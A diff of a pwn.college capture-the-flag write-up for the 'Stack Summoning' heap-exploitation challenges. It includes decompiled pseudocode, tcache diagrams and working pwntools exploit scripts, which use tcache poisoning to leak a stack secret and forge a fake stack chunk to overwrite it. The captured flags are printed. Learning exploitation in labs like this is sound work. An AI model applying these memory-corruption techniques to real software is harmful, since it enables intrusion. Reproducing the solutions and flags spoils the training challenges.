@@ -4660,8 +4660,8 @@ else
 ```
 
 ```
-malloc(0) → ptr[0] = &A  (real heap, passes guard)
-malloc(1) → ptr[1] = NULL (secret_addr discarded by guard)
+malloc(0) -> ptr[0] = &A  (real heap, passes guard)
+malloc(1) -> ptr[1] = NULL (secret_addr discarded by guard)
             but entries[128] (raw memory) = secret[:8]
             count[128] = 0, so displayed as NULL
 
@@ -6576,58 +6576,162 @@ If you can leak out this secret, you can redeem it for the flag.
 ```c title="/challenge/stack-summoning-easy :: main() :: Pseudocode" showLineNumbers
 int __fastcall main(int argc, const char **argv, const char **envp)
 {
-  // ...
-  _BYTE v13[64];   // [rsp+C0h]  [rbp-1A0h]
-  _BYTE v14[185];  // [rsp+100h] [rbp-160h]
-  char  v15[23];   // [rsp+1B9h] [rbp-A7h]   <- secret stored here
-  char  s1[136];   // [rsp+1D0h] [rbp-90h]
-  // ...
+  int v3; // eax
+  int v4; // eax
+  int i; // [rsp+2Ch] [rbp-234h]
+  unsigned int v7; // [rsp+30h] [rbp-230h]
+  unsigned int v8; // [rsp+30h] [rbp-230h]
+  unsigned int v9; // [rsp+30h] [rbp-230h]
+  unsigned int v10; // [rsp+30h] [rbp-230h]
+  unsigned int size; // [rsp+34h] [rbp-22Ch]
+  void *ptr[16]; // [rsp+40h] [rbp-220h] BYREF
+  _BYTE v13[64]; // [rsp+C0h] [rbp-1A0h] BYREF
+  _BYTE v14[185]; // [rsp+100h] [rbp-160h] BYREF
+  char v15[23]; // [rsp+1B9h] [rbp-A7h] BYREF
+  char s1[136]; // [rsp+1D0h] [rbp-90h] BYREF
+  unsigned __int64 v17; // [rsp+258h] [rbp-8h]
 
+  v17 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
   for ( i = 0; i <= 15; ++i )
     v15[i] = rand() % 26 + 97;
-
+  puts(
+    "This challenge allows you to perform various heap operations, some of which may involve the flag. Through this series of");
+  puts("challenges, you will become familiar with the concept of heap exploitation.\n");
+  printf("This challenge can manage up to %d unique allocations.\n\n", 16);
   printf("In this challenge, there is a secret stored at %p.\n", v15);
-
-  // stack_free
-  printf("[*] free(%p)\n", v14);
-  free(v14);
-
-  // stack_scanf
-  printf("[*] scanf(\"%%127s\", %p)\n", v13);
-  __isoc99_scanf("%127s", v13);
-
-  // send_flag
-  if ( !memcmp(s1, v15, 0x10u) )
+  puts("If you can leak out this secret, you can redeem it for the flag.\n");
+  while ( 1 )
   {
-    puts("Authorized!");
-    win();
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              while ( 1 )
+              {
+                print_tcache(main_thread_tcache);
+                puts(byte_35BA);
+                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_35BA);
+                if ( strcmp(s1, "malloc") )
+                  break;
+                printf("Index: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_35BA);
+                v7 = atoi(s1);
+                if ( v7 > 0xF )
+                  __assert_fail("allocation_index < 16", "<stdin>", 0x118u, "main");
+                printf("Size: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_35BA);
+                size = atoi(s1);
+                printf("[*] allocations[%d] = malloc(%d)\n", v7, size);
+                ptr[v7] = malloc(size);
+                printf("[*] allocations[%d] = %p\n", v7, ptr[v7]);
+              }
+              if ( strcmp(s1, "free") )
+                break;
+              printf("Index: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_35BA);
+              v8 = atoi(s1);
+              if ( v8 > 0xF )
+                __assert_fail("allocation_index < 16", "<stdin>", 0x12Au, "main");
+              printf("[*] free(allocations[%d])\n", v8);
+              free(ptr[v8]);
+            }
+            if ( strcmp(s1, "puts") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_35BA);
+            v9 = atoi(s1);
+            if ( v9 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x137u, "main");
+            printf("[*] puts(allocations[%d])\n", v9);
+            printf("Data: ");
+            puts((const char *)ptr[v9]);
+          }
+          if ( strcmp(s1, "scanf") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_35BA);
+          v10 = atoi(s1);
+          if ( v10 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x144u, "main");
+          v3 = malloc_usable_size(ptr[v10]);
+          sprintf(s1, "%%%us", v3);
+          v4 = malloc_usable_size(ptr[v10]);
+          printf("[*] scanf(\"%%%us\", allocations[%d])\n", v4, v10);
+          __isoc99_scanf(s1, ptr[v10]);
+          puts(byte_35BA);
+        }
+        if ( strcmp(s1, "send_flag") )
+          break;
+        printf("Secret: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_35BA);
+        if ( !memcmp(s1, v15, 0x10u) )
+        {
+          puts("Authorized!");
+          win();
+        }
+        else
+        {
+          puts("Not authorized!");
+        }
+      }
+      if ( strcmp(s1, "stack_free") )
+        break;
+      printf("[*] free(%p)\n", v14);
+      free(v14);
+    }
+    if ( strcmp(s1, "stack_scanf") )
+      break;
+    printf("[*] scanf(\"%%127s\", %p)\n", v13);
+    __isoc99_scanf("%127s", v13);
+    puts(byte_35BA);
   }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
 }
 ```
 
-The secret is a 16-byte random string stored at `v15` on the stack, whose address is printed at startup. The goal is to leak it and pass it to `send_flag`.
+This challenge is essentially the same as the [Seeking Secrets](#seeking-secrets-easy) challenges. A 16-byte secret is stored at a known address, printed at startup, and we have to leak it using tcache poisoning. The only difference is that the secret lives on the stack rather than in the data segment. Since the stack address is printed at startup just like the BSS address was in Seeking Secrets, this makes no difference to the exploit.
 
-The challenge provides `stack_free` which frees `v14` (a stack buffer) and prints its address, and `stack_scanf` which writes 127 bytes into `v13` (another stack buffer). We also have the standard heap `malloc`, `free`, `puts`, and `scanf`.
+The `stack_free` and `stack_scanf` commands are not needed at all for the easy version. The solution uses only the standard heap primitives.
 
-### Reading a Stack Secret with Tcache Poisoning
+### Polluting Tcache `entry_struct` to Leak the Secret
 
-We cannot read from `secret_addr` directly using `puts` since `puts` only reads from pointers stored in `ptr[]`, and we have no way to put `secret_addr` into `ptr[]` directly. Instead we use tcache poisoning to make `malloc` return `secret_addr`, giving us a pointer in `ptr[]` that we can then `puts` to leak the secret.
+The approach is identical to Seeking Secrets. We allocate two heap chunks, free them into the tcache, and poison the first chunk's `next` to point at `secret_addr`. We then `malloc` twice and `puts` on the second allocation to leak the secret.
 
-The standard tcache poisoning approach works here: allocate two heap chunks, free them, poison the first chunk's `next` to point at `secret_addr`, malloc twice to drain the chain, and `puts` on the second allocation which points at the secret.
+The one subtlety is that the tcache count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the tcache entirely, even if `entries[idx]` points somewhere valid.
 
-The key insight is that the tcache count must be at least 1 when we call the final `malloc` that should return `secret_addr`. When `malloc` pops a chunk, it reads that chunk's `next` field, writes it into `entries[idx]`, and decrements `counts[idx]`. If count drops to 0, the next `malloc` call bypasses the tcache entirely even if `entries[idx]` points somewhere valid. So we need count=1 going into the malloc that pops the chunk pointing to `secret_addr`, not count=0.
+With two heap chunks freed (count=2), the sequence works out correctly:
 
-With two heap chunks freed (count=2), the sequence is:
-
-1. `free(b)`, `free(a)` — tcache: `a -> b`, count=2
-2. Poison `a`'s `next` to `secret_addr` — tcache: `a -> secret_addr`, count=2
-3. `malloc` — pops `a`, count=1, `entries = secret_addr`
-4. `malloc` — count=1 so tcache is used, pops `secret_addr`, count=0
-
-Step 4 works because count is still 1 when we call it. If we had only freed one chunk, count would be 0 after step 3 and step 4 would go to the heap.
+1. `free(1)`, `free(0)`, tcache: `A -> B`, count=2
+2. Poison `A`'s `next` to `secret_addr`, tcache: `A -> secret_addr`, count=2
+3. `malloc` pops `A`, count=1, `entries = secret_addr`
+4. `malloc`, count=1 so tcache is used, pops `secret_addr`, count=0
 
 ```
-free(b), free(a)
+free(1), free(0)
 
 
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
@@ -6637,11 +6741,11 @@ free(b), free(a)
 ┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
 ┊   entries: ┃ entry_192: &A  ┃                                        ┊
 ┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
-└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
-                              │
-              ╭───────────────╯
-              │
-              v
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                          │
+        ╭─────────────────╯
+        │
+        v
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┆  tcache_entry A  ┆
 ├──────────────────┤
@@ -6650,9 +6754,9 @@ free(b), free(a)
 │    key: Void     │     │
 └──────────────────┘     │
                          │
-         ╭───────────────╯
-         │
-         v
+        ╭────────────────╯
+        │
+        v
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┆  tcache_entry B  ┆
 ├──────────────────┤
@@ -6672,11 +6776,11 @@ scanf(0, p64(secret_addr))
 ┊            ┣━━━━━━━━━━━━━━━━┫                                        ┊
 ┊   entries: ┃ entry_192: &A  ┃                                        ┊
 ┊            ┗━━━━━━━━━━━━━━━━┛                                        ┊
-└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
-                              │
-              ╭───────────────╯
-              │
-              v
+└┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄│┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┘
+                          │
+        ╭─────────────────╯
+        │
+        v
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
 ┆  tcache_entry A  ┆
 ├──────────────────┤
@@ -6685,20 +6789,20 @@ scanf(0, p64(secret_addr))
 │    key: Void     │     │
 └──────────────────┘     │
                          │
-         ╭───────────────╯
-         │
-         v
+        ╭────────────────╯
+        │
+        v
 ┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
-┆  STACK (secret_addr)      ┆
+┆  STACK (secret_addr)     ┆
 ├──────────────────────────┤
-│  secret[:8]               │
+│  next: secret[:8]        │
 ├──────────────────────────┤
-│  secret[8:16]             │
+│  key:  secret[8:16]      │
 └──────────────────────────┘
 
 
-malloc(2) → pops A, count=1, entries=secret_addr
-malloc(3) → count=1 so tcache used, pops secret_addr, count=0
+malloc(2) -> pops A, count=1, entries=secret_addr
+malloc(3) -> count=1 so tcache is used, pops secret_addr, count=0
 ```
 
 ### Exploit
@@ -6743,7 +6847,7 @@ def puts_chunk(idx):
     p.recvuntil(b"quit): ")
     return data
 
-# allocate two heap chunks of the same bin as secret_addr region
+# allocate two heap chunks
 a = malloc_leak(0, 192)
 b = malloc_leak(1, 192)
 print(f"[*] a: {hex(a)}")
@@ -6764,7 +6868,6 @@ print(f"[*] malloc(2) = {hex(c)}")
 d = malloc_leak(3, 192)
 print(f"[*] malloc(3) = {hex(d)}")
 
-# puts on ptr[3] which points at secret_addr
 secret = puts_chunk(3).ljust(16, b"\x00")[:16]
 print(f"[*] secret: {secret}")
 
@@ -6775,17 +6878,260 @@ print(p.recvuntil(b"}").decode())
 
 ```
 hacker@dynamic-allocator-misuse~stack-summoning-easy:/$ python ~/script.py 
-[+] Starting local process '/challenge/stack-summoning-easy': pid 19395
-[*] secret at: 0x7fff8f23d479
-[*] a: 0x61c7120312c0
-[*] b: 0x61c712031390
-[*] malloc(2) = 0x61c7120312c0 (should be 0x61c7120312c0)
-[*] malloc(3) = 0x7fff8f23d479 (should be 0x7fff8f23d479)
+[+] Starting local process '/challenge/stack-summoning-easy': pid 552
+[*] secret at: 0x7ffe05789919
+[*] a: 0x61d8d729f2c0
+[*] b: 0x61d8d729f390
+[*] malloc(2) = 0x61d8d729f2c0
+[*] malloc(3) = 0x7ffe05789919
 [*] secret: b'gfpzbhga\x00\x00\x00\x00\x00\x00\x00\x00'
 
 Secret: 
 Authorized!
 You win! Here is your flag:
 pwn.college{oPteTG796tBkHRpITEGLmil50q9.0VN5MDL4ITM0EzW}
-[*] Stopped process '/challenge/stack-summoning-easy' (pid 19395)
+[*] Stopped process '/challenge/stack-summoning-easy' (pid 552)
+```
+
+&nbsp;
+
+## Stack Summoning (Hard)
+
+```
+hacker@dynamic-allocator-misuse~stack-summoning-hard:/$ /challenge/stack-summoning-hard
+###
+### Welcome to /challenge/stack-summoning-hard!
+###
+
+
+[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit):
+```
+
+The solution for the hard version is different from the easy one. Instead of leaking the secret and submitting it, we overwrite it with a known value and submit that instead.
+
+### Binary Analysis
+
+```c title="/challenge/stack-summoning-hard :: main() :: Pseudocode" showLineNumbers
+int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  int v3; // eax
+  int i; // [rsp+2Ch] [rbp-204h]
+  unsigned int v6; // [rsp+30h] [rbp-200h]
+  unsigned int v7; // [rsp+30h] [rbp-200h]
+  unsigned int v8; // [rsp+30h] [rbp-200h]
+  unsigned int v9; // [rsp+30h] [rbp-200h]
+  unsigned int size; // [rsp+34h] [rbp-1FCh]
+  void *ptr[16]; // [rsp+40h] [rbp-1F0h] BYREF
+  _BYTE v12[64]; // [rsp+C0h] [rbp-170h] BYREF
+  __int64 v13; // [rsp+100h] [rbp-130h] BYREF
+  char v14[22]; // [rsp+18Ah] [rbp-A6h] BYREF
+  char s1[136]; // [rsp+1A0h] [rbp-90h] BYREF
+  unsigned __int64 v16; // [rsp+228h] [rbp-8h]
+
+  v16 = __readfsqword(0x28u);
+  setvbuf(stdin, nullptr, 2, 0);
+  setvbuf(stdout, nullptr, 2, 1u);
+  puts("###");
+  printf("### Welcome to %s!\n", *argv);
+  puts("###");
+  putchar(10);
+  memset(ptr, 0, sizeof(ptr));
+  for ( i = 0; i <= 15; ++i )
+    v14[i] = rand() % 26 + 97;
+  while ( 1 )
+  {
+    while ( 1 )
+    {
+      while ( 1 )
+      {
+        while ( 1 )
+        {
+          while ( 1 )
+          {
+            while ( 1 )
+            {
+              while ( 1 )
+              {
+                puts(byte_214C);
+                printf("[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_214C);
+                if ( strcmp(s1, "malloc") )
+                  break;
+                printf("Index: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_214C);
+                v6 = atoi(s1);
+                if ( v6 > 0xF )
+                  __assert_fail("allocation_index < 16", "<stdin>", 0x73u, "main");
+                printf("Size: ");
+                __isoc99_scanf("%127s", s1);
+                puts(byte_214C);
+                size = atoi(s1);
+                ptr[v6] = malloc(size);
+              }
+              if ( strcmp(s1, "free") )
+                break;
+              printf("Index: ");
+              __isoc99_scanf("%127s", s1);
+              puts(byte_214C);
+              v7 = atoi(s1);
+              if ( v7 > 0xF )
+                __assert_fail("allocation_index < 16", "<stdin>", 0x83u, "main");
+              free(ptr[v7]);
+            }
+            if ( strcmp(s1, "puts") )
+              break;
+            printf("Index: ");
+            __isoc99_scanf("%127s", s1);
+            puts(byte_214C);
+            v8 = atoi(s1);
+            if ( v8 > 0xF )
+              __assert_fail("allocation_index < 16", "<stdin>", 0x8Fu, "main");
+            printf("Data: ");
+            puts((const char *)ptr[v8]);
+          }
+          if ( strcmp(s1, "scanf") )
+            break;
+          printf("Index: ");
+          __isoc99_scanf("%127s", s1);
+          puts(byte_214C);
+          v9 = atoi(s1);
+          if ( v9 > 0xF )
+            __assert_fail("allocation_index < 16", "<stdin>", 0x9Bu, "main");
+          v3 = malloc_usable_size(ptr[v9]);
+          sprintf(s1, "%%%us", v3);
+          __isoc99_scanf(s1, ptr[v9]);
+          puts(byte_214C);
+        }
+        if ( strcmp(s1, "send_flag") )
+          break;
+        printf("Secret: ");
+        __isoc99_scanf("%127s", s1);
+        puts(byte_214C);
+        if ( !memcmp(s1, v14, 0x10u) )
+        {
+          puts("Authorized!");
+          win();
+        }
+        else
+        {
+          puts("Not authorized!");
+        }
+      }
+      if ( strcmp(s1, "stack_free") )
+        break;
+      free(&v13);
+    }
+    if ( strcmp(s1, "stack_scanf") )
+      break;
+    __isoc99_scanf("%127s", v12);
+    puts(byte_214C);
+  }
+  if ( strcmp(s1, "quit") )
+    puts("Unrecognized choice!");
+  puts("### Goodbye!");
+  return 0;
+}
+```
+
+This version prints nothing: no address leaks, no tcache display, no allocation addresses. So we cannot use the same approach as the easy version since we have no way to know `v14`'s address to poison the tcache with.
+
+Instead we take the opposite approach: rather than leaking the secret, we overwrite it with a value we choose, then submit that value to `send_flag`.
+
+### Overwriting the Secret
+
+The stack layout gives us everything we need:
+
+- `v12` at `[rbp-0x170]`, written by `stack_scanf`
+- `v13` at `[rbp-0x130]`, freed by `stack_free`
+- `v14` at `[rbp-0xa6]`, the secret
+
+`v13` is 64 bytes past `v12`, so `stack_scanf` can plant a fake size field at `v13 - 0x8` (56 bytes into `v12`) just like the Stack Spoofing Hard challenge. We use `0xb1` as the fake size, giving a chunk of 176 bytes with `malloc_usable_size` returning 168 bytes.
+
+After `stack_free` puts `v13` into the tcache, we `malloc` of the same size to get `v13` back into `ptr[0]`. Now `ptr[0]` points directly at `v13`. `v14` sits at `v13 + 0x8a` = offset 138. Since `malloc_usable_size` returns 168 bytes, heap `scanf` lets us write 168 bytes into `ptr[0]`, which is more than enough to reach `v14` at offset 138.
+
+```
+┌┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┐
+┊  STACK                                                               ┊
+├──────────────────────────────────────────────────────────────────────┤
+│  rbp-0x170: v12  <- stack_scanf writes here                          │
+│             "B" * 56 bytes of padding                                │
+├──────────────────────────────────────────────────────────────────────┤
+│  rbp-0x138: fake size field = 0xb1  <- v13 - 0x8                     │
+├──────────────────────────────────────────────────────────────────────┤
+│  rbp-0x130: v13  <- stack_free frees here, malloc returns here       │
+│             ptr[0] = &v13                                            │
+│             "B" * 138 bytes of padding via heap scanf                │
+├──────────────────────────────────────────────────────────────────────┤
+│  rbp-0x0a6: v14  <- secret, overwritten with "AAAAAAAAAAAAAAAA"      │
+└──────────────────────────────────────────────────────────────────────┘
+```
+
+We write 138 bytes of padding followed by our chosen 16-byte secret into `ptr[0]`, overwriting `v14`. Then we submit that known secret to `send_flag`.
+
+### Exploit
+
+```python title="~/script.py" showLineNumbers
+from pwn import *
+
+p = process("/challenge/stack-summoning-hard")
+p.recvuntil(b"quit): ")
+
+known_secret = b"AAAAAAAAAAAAAAAA"
+
+def malloc_idx(idx, size):
+    p.sendline(b"malloc")
+    p.sendline(str(idx).encode())
+    p.sendline(str(size).encode())
+    p.recvuntil(b"quit): ")
+
+def free_chunk(idx):
+    p.sendline(b"free")
+    p.sendline(str(idx).encode())
+    p.recvuntil(b"quit): ")
+
+def scanf_chunk(idx, data):
+    p.sendline(b"scanf")
+    p.sendline(str(idx).encode())
+    p.sendline(data)
+    p.recvuntil(b"quit): ")
+
+# forge fake size at v13-0x8 (56 bytes into v12)
+# 0xb1 = 176 byte chunk, malloc_usable_size returns 168
+p.sendline(b"stack_scanf")
+p.sendline(b"A" * 56 + p64(0xb1))
+p.recvuntil(b"quit): ")
+
+# free v13 into tcache
+p.sendline(b"stack_free")
+p.recvuntil(b"quit): ")
+
+# malloc to get v13 back as ptr[0]
+malloc_idx(0, 160)
+
+# v14 is at v13+0x8a = offset 138
+# overwrite v14 with our known secret
+scanf_chunk(0, b"B" * 138 + known_secret)
+
+# submit known secret
+p.sendline(b"send_flag")
+p.sendline(known_secret)
+print(p.recvall(timeout=3).decode())
+```
+
+```
+hacker@dynamic-allocator-misuse~stack-summoning-hard:/$ python ~/script.py 
+[+] Starting local process '/challenge/stack-summoning-hard': pid 2531
+[+] Receiving all data: Done (187B)
+[*] Stopped process '/challenge/stack-summoning-hard' (pid 2531)
+
+Secret: 
+Authorized!
+You win! Here is your flag:
+pwn.college{A0nx5d15jSFQQZxlfrkuIFs1Cfb.0lN5MDL4ITM0EzW}
+
+
+
+[*] Function (malloc/free/puts/scanf/stack_free/stack_scanf/send_flag/quit): 
 ```
